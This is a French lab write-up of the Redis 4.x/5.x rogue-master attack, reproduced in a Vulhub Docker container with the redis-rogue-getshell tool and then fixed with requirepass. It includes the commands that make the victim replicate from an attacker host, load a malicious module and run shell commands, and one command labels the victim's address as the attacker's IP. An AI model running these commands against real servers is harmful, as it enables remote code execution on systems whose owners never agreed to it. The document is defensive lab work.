# Redis Post Exploitation Due to Master and Slave Synchronisation
## Présentation du logiciel

Redis est une base de données en mémoire à haute performance de type clé-valeur, principalement utilisée pour la mise en cache, la gestion des sessions et d'autres applications nécessitant une réponse rapide. Il stocke les données en mémoire, ce qui le rend exceptionnellement rapide et fiable, et prend en charge des structures de données polyvalentes comme les chaînes, les listes, les ensembles et les hachages.  

## Chargement de l'image Vulhub

Nous utilisons l'environnement Vulhub pour déployer une version vulnérable de Redis (4.x/5.x) via Docker.

### Création et lancement du conteneur
```
git clone https://github.com/vulhub/vulhub
cd vulhub/redis/4-unacc
sudo docker-compose up -d
```

### Vérification du fonctionnement
Nous vérifions que le serveur est accessible sans restriction.
```
redis-cli -h ip-du-serveur
```
Cela devrait retourner l'invite de commande redis.

## Présentation de la vulnérabilité

La vulnérabilité exploitée n'est pas un bug logiciel classique, mais une faiblesse structurelle dans le modèle de sécurité des versions Redis 4.x et 5.x.

Ces versions introduisent une fonctionnalité puissante, le chargement dynamique de modules (MODULE LOAD), mais ne disposent pas encore des listes de contrôle d'accès (ACL) granulaires (apparues seulement en version 6.0). En conséquence, tout utilisateur capable de se connecter à l'instance possède implicitement les privilèges administratifs complets.

L'attaque repose sur l'abus de fonctionnalités légitimes :

1. Le protocole de réplication (SLAVEOF) permet de forcer la synchronisation de données.

2. L'absence de restriction sur la commande MODULE LOAD permet d'injecter et d'exécuter du code compilé arbitraire.

C'est la combinaison de ces fonctionnalités, accessibles sans restriction dans une configuration par défaut non authentifiée, qui transforme une base de données en vecteur d'exécution de code à distance (RCE).

## Exploit de la vulnérabilité

Nous utilisons l'outil [redis-rogue-getshell]() qui automatise l'attaque "Rogue Master"

### Préparation de l'outil
Nous clonons le dépôt. Notez qu'une modification du code source est nécessaire sur les systèmes récents pour éviter une erreur de compilation.
```
git clone https://github.com/vulhub/redis-rogue-getshell
cd redis-rogue-getshell
nano /home/kali/vulhub/redis/4-unacc/redis-rogue-getshell/RedisModulesSDK/exp/exp.c
```

```c
#include <string.h>
#include <arpa/inet.h>
```

### Compilation du code malveillant
```
cd ../
make
cd ../
```
### Execution de l'attaque

Nous lançons le script Python en définissant l'IP de la victime (-r) et notre IP d'attaquant (-L) pour le callback.

Test 1 : Obtention de l'identité (Preuve RCE)
```
python3 redis-master.py -r <ip-attaquant> -p 6379 -L <ip-attaquant> -P 8888 -f RedisModulesSDK/exp.so -c "id"
```

Test 2 : Création de fichier (Preuve de persistance)
```
python3 redis-master.py -r <ip-victime> -p 6379 -L <ip-attaquant> -P 8888 -f RedisModulesSDK/exp.so -c "touch /tmp/PreuveDeHack"
```
On peut ensuite vérifier sur la victime que le fichier /tmp/PreuveDeHack existe.
```
sudo docker exec -it <id-du-conteneur> ls -l /tmp/
```

## Explication de la raison pour laquelle l’exploit fonctionne

L'exploit repose sur la chaîne d'événements suivante, rendue possible par l'absence d'authentification :

1. Imitation du Maître : Le script d'attaque se comporte comme un serveur Redis Maître et envoie la commande SLAVEOF à la victime. La victime, configurée sans sécurité, accepte de devenir l'esclave de l'attaquant.

2. Synchronisation Malveillante : Le protocole de réplication Redis impose une synchronisation complète. L'attaquant envoie alors le module malveillant (exp.so) sous forme de flux de données binaires, que la victime écrit sur son disque.

3. Chargement de Module : Une fois le fichier sur le disque, l'attaquant envoie la commande MODULE LOAD ./exp.so. Redis charge ce code compilé en mémoire.

4. Exécution : Le module chargé ajoute une nouvelle commande (ici system.exec) qui permet de passer des commandes directement au système d'exploitation sous l'identité de l'utilisateur Redis.


## Proposition justifiée d’un correctif

Pour déterminer le correctif adéquat, nous avons analysé la chaîne d'attaque et évalué les mécanismes de sécurité disponibles dans cette version de Redis.

### Analyse de la cause racine
L'attaque réussit car le serveur accepte aveuglément des commandes critiques (CONFIG, SLAVEOF, MODULE LOAD) de n'importe quel utilisateur connecté. Le problème fondamental n'est pas l'existence de ces commandes (qui sont utiles), mais l'absence de contrôle sur qui a le droit de les exécuter.

### Évaluation des solutions possibles 
Conformément aux contraintes du projet, la mise à jour vers Redis 6 (qui possède des ACLs fines) est interdite. Il nous reste deux options de configuration :  

1. Option A : Renommer ou désactiver les commandes dangereuses (rename-command).

- Avantage : Empêche spécifiquement l'usage de MODULE ou CONFIG.

- Inconvénient : Complexe à mettre en œuvre sans fichier de configuration (redis.conf) et risque de casser des outils d'administration légitimes qui dépendent de ces commandes.

2. Option B : Activer l'authentification (requirepass).

- Avantage : Bloque l'accès à toutes les commandes pour toute personne non autorisée. C'est la mesure de sécurité native prévue par les concepteurs de Redis pour ce scénario.

### Solution retenue
Nous choisissons l'activation de l'authentification. C'est la solution la plus robuste car elle applique une défense en profondeur : au lieu de courir après chaque commande dangereuse, nous bloquons l'accès initial au serveur. Sans le mot de passe, l'attaquant ne peut même pas initier le dialogue avec le serveur, neutralisant l'attaque à l'étape 0.

## Application du correctif

L'image Docker utilisée étant minimaliste (pas d'éditeur de texte ni de fichier redis.conf par défaut), nous appliquons le correctif directement en mémoire via la commande CONFIG SET. Cela sécurise le serveur immédiatement sans redémarrage.

Sur la VM victime :
```
edis-cli -h 127.0.0.1                                   
127.0.0.1:6379> CONFIG SET requirepass "Securite123!"
OK
127.0.0.1:6379> exit
```

## Démonstration que l’exploit ne fonctionne plus

### Vérification manuelle
Nous tentons de lister les clés sans mot de passe. L'accès doit être refusé.
```
edis-cli -h 192.168.125.128                            
192.168.125.128:6379> KEYS *
(error) NOAUTH Authentication required.
192.168.125.128:6379> exit
```

### Échec du script d'attaque
Nous relançons le script d'exploitation. Celui-ci échoue désormais car il ne peut plus s'authentifier pour envoyer les commandes de configuration.
```
python3 redis-master.py -r 192.168.125.128 -p 6379 -L 192.168.125.129 -P 8888 -f RedisModulesSDK/exp.so -c "id"
```
Sortie observée : 
```
>> send data: b'*3\r\n$7\r\nSLAVEOF\r\n$15\r\n192.168.125.129\r\n$4\r\n8888\r\n'
>> receive data: b'-NOAUTH Authentication required.\r\n'
>> send data: b'*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n$6\r\nexp.so\r\n'
>> receive data: b'-NOAUTH Authentication required.\r\n'
```
L'attaque est bloquée par l'erreur NOAUTH.
